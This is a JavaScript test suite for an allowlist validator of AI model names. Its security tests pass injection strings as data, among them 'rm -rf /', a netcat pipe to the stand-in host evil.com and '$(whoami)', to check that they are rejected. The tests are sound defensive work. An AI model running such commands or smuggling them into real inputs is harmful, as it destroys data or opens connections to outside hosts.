// Test suite for Issue #466: Input Validation for workers array
// Tests the validateWorkers function to ensure it properly validates model names

// Mock function for testing (replaces the actual import)
function validateWorkers(workersArg, allowedModels) {
  if (!workersArg || typeof workersArg !== 'string') {
    throw new Error('Workers argument must be a non-empty string')
  }

  const workers = workersArg.split(',').map(w => w.trim().toLowerCase())

  // Remove empty strings from split
  const nonEmptyWorkers = workers.filter(w => w.length > 0)

  if (nonEmptyWorkers.length === 0) {
    throw new Error('Workers list cannot be empty after parsing')
  }

  // Validate each worker against allowed models
  const invalidModels = nonEmptyWorkers.filter(w => !allowedModels.includes(w))

  if (invalidModels.length > 0) {
    throw new Error(
      `Invalid model name(s): ${invalidModels.join(', ')}. ` +
      `Allowed models: ${allowedModels.join(', ')}`
    )
  }

  // Remove duplicates while preserving order
  return [...new Set(nonEmptyWorkers)]
}

// Test suite
console.log('═'.repeat(60))
console.log('Testing Issue #466: Workers Array Input Validation')
console.log('═'.repeat(60))
console.log('')

const ALLOWED_MODELS = ['opus', 'sonnet', 'haiku', 'gemini']

// Test 1: Valid single model
console.log('Test 1: Valid single model (opus)')
try {
  const result = validateWorkers('opus', ALLOWED_MODELS)
  console.log('✅ PASS:', result)
  console.assert(result.length === 1 && result[0] === 'opus', 'Should return [opus]')
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 2: Valid multiple models
console.log('\nTest 2: Valid multiple models (opus,sonnet,haiku)')
try {
  const result = validateWorkers('opus,sonnet,haiku', ALLOWED_MODELS)
  console.log('✅ PASS:', result)
  console.assert(
    result.length === 3 && result[0] === 'opus' && result[1] === 'sonnet' && result[2] === 'haiku',
    'Should return [opus, sonnet, haiku]'
  )
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 3: Case insensitivity
console.log('\nTest 3: Case insensitivity (OPUS, SonNet)')
try {
  const result = validateWorkers('OPUS,SonNet', ALLOWED_MODELS)
  console.log('✅ PASS:', result)
  console.assert(
    result.length === 2 && result[0] === 'opus' && result[1] === 'sonnet',
    'Should normalize to lowercase'
  )
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 4: Whitespace handling
console.log('\nTest 4: Whitespace handling (opus , sonnet , haiku)')
try {
  const result = validateWorkers('opus , sonnet , haiku', ALLOWED_MODELS)
  console.log('✅ PASS:', result)
  console.assert(
    result.length === 3 && result[0] === 'opus' && result[1] === 'sonnet',
    'Should trim whitespace'
  )
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 5: Duplicate removal
console.log('\nTest 5: Duplicate removal (opus,opus,sonnet,sonnet)')
try {
  const result = validateWorkers('opus,opus,sonnet,sonnet', ALLOWED_MODELS)
  console.log('✅ PASS:', result)
  console.assert(result.length === 2 && !result.includes('opus') || result.filter(m => m === 'opus').length === 1,
    'Should remove duplicates'
  )
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 6: Invalid model name (SECURITY)
console.log('\nTest 6: Invalid model name (invalid-model) - SECURITY')
try {
  validateWorkers('invalid-model', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected invalid model name')
} catch (e) {
  console.log('✅ PASS: Correctly rejected invalid model')
  console.log('   Error:', e.message)
  console.assert(e.message.includes('Invalid model name'), 'Should mention invalid model')
  console.assert(e.message.includes('Allowed models'), 'Should list allowed models')
}

// Test 7: Injection attempt 1 - Command injection
console.log('\nTest 7: Command injection attempt (opus; rm -rf /) - SECURITY')
try {
  validateWorkers('opus; rm -rf /', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected command injection attempt')
} catch (e) {
  console.log('✅ PASS: Correctly rejected injection attempt')
  console.log('   Error:', e.message)
}

// Test 8: Injection attempt 2 - Flag injection
console.log('\nTest 8: Flag injection attempt (opus --malicious-flag) - SECURITY')
try {
  validateWorkers('opus --malicious-flag', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected flag injection attempt')
} catch (e) {
  console.log('✅ PASS: Correctly rejected injection attempt')
  console.log('   Error:', e.message)
}

// Test 9: Injection attempt 3 - Pipe injection
console.log('\nTest 9: Pipe injection attempt (opus | nc evil.com 1234) - SECURITY')
try {
  validateWorkers('opus | nc evil.com 1234', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected pipe injection attempt')
} catch (e) {
  console.log('✅ PASS: Correctly rejected injection attempt')
  console.log('   Error:', e.message)
}

// Test 10: Injection attempt 4 - Process substitution
console.log('\nTest 10: Process substitution attempt (opus $(whoami)) - SECURITY')
try {
  validateWorkers('opus $(whoami)', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected process substitution attempt')
} catch (e) {
  console.log('✅ PASS: Correctly rejected injection attempt')
  console.log('   Error:', e.message)
}

// Test 11: Empty string
console.log('\nTest 11: Empty string')
try {
  validateWorkers('', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected empty string')
} catch (e) {
  console.log('✅ PASS: Correctly rejected empty string')
  console.log('   Error:', e.message)
}

// Test 12: Only commas
console.log('\nTest 12: Only commas (,,,)')
try {
  validateWorkers(',,,', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected empty workers list')
} catch (e) {
  console.log('✅ PASS: Correctly rejected empty list')
  console.log('   Error:', e.message)
}

// Test 13: null/undefined
console.log('\nTest 13: null value')
try {
  validateWorkers(null, ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected null')
} catch (e) {
  console.log('✅ PASS: Correctly rejected null')
  console.log('   Error:', e.message)
}

// Test 14: Multiple invalid models
console.log('\nTest 14: Multiple invalid models (invalid1,invalid2,opus)')
try {
  validateWorkers('invalid1,invalid2,opus', ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected invalid models')
} catch (e) {
  console.log('✅ PASS: Correctly rejected invalid models')
  console.log('   Error:', e.message)
  console.assert(e.message.includes('invalid1'), 'Should mention invalid1')
  console.assert(e.message.includes('invalid2'), 'Should mention invalid2')
}

// Test 15: Default valid list
console.log('\nTest 15: Default valid list (opus,sonnet,haiku)')
try {
  const result = validateWorkers('opus,sonnet,haiku', ALLOWED_MODELS)
  console.log('✅ PASS: Default list is valid')
  console.assert(result.length === 3, 'Should have 3 models')
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 16: All valid models
console.log('\nTest 16: All valid models (opus,sonnet,haiku,gemini)')
try {
  const result = validateWorkers('opus,sonnet,haiku,gemini', ALLOWED_MODELS)
  console.log('✅ PASS:', result)
  console.assert(result.length === 4, 'Should have 4 models')
} catch (e) {
  console.log('❌ FAIL:', e.message)
}

// Test 17: Non-string input
console.log('\nTest 17: Non-string input (array)')
try {
  validateWorkers(['opus', 'sonnet'], ALLOWED_MODELS)
  console.log('❌ FAIL: Should have rejected array input')
} catch (e) {
  console.log('✅ PASS: Correctly rejected non-string input')
  console.log('   Error:', e.message)
}

console.log('')
console.log('═'.repeat(60))
console.log('Issue #466 Test Suite Complete')
console.log('═'.repeat(60))
